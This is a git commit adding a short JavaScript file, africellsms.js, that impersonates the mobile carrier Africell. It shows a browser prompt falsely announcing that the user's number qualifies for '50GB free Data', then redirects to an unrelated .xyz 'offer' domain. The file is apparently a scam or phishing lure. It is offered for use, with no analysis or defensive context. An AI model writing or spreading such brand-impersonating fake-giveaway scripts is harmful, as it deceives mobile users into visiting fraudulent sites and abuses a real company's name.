3fccdc08e7def4154dfc2ccac0df20d5d7817295
bigetijazz4 <bigetijazz4@gmail.com>
2024-11-15 21:40:59 -0800

    Create africellsms.js

---
+++ africellsms.js
@@ -0,0 +1,5 @@
+var password = 'ACTIVATE 50GB'
+password=prompt('Africell: Congratulations, Your mobile Number is Eligible to receive 50GB free Data Africell OLD SIM REWARD, kindly press Ok to proceed now','ACTIVATE 50GB');
+if (password != 'ACTIVATE 50GB') {
+location.href='https://www.moreofferzdetails.xyz/Africell50gb';
+}
